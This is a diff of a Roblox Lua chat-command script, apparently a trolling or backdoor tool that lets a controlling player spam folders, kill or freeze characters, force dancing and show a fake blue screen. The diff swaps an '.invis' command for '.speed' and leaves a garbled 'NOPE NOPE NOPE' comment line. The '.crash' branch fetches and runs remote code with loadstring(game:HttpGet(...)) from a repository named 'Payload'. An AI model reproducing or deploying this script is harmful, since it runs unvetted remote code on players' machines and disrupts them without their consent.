@@ -6,7 +6,7 @@
 .spamfolders - Spam folders in workspace {like 35}
 .crash - Will run fake bsod
 .kill
-.invis - Makes character invisible
+.speed [NUMBER]                                       NOPE NOPE NOPE .invis - Makes character invisible 
 .dance - Forces you to dance 5 sec.
 --]]
 
@@ -37,13 +37,11 @@ if mainPlayer then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/BSODmodified",true))()
         elseif msg == ".kill" then
             LocalP.Character.Humanoid:ChangeState(15)
-        elseif msg == ".invis" then
-            local targetChar = LocalP.Character
-            if targetChar then
-                local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
-                if targetHumanoid then
-                    targetHumanoid.WalkSpeed = 0
-                end
+        elseif msg:sub(1, 6) == ".speed" then
+            local newSpeed = tonumber(msg:sub(8))
+            if newSpeed then
+                character:WaitForChild("Humanoid")
+                character.Humanoid.WalkSpeed = newSpeed
             end
         elseif msg == ".dance" then
             if isDancing == false then
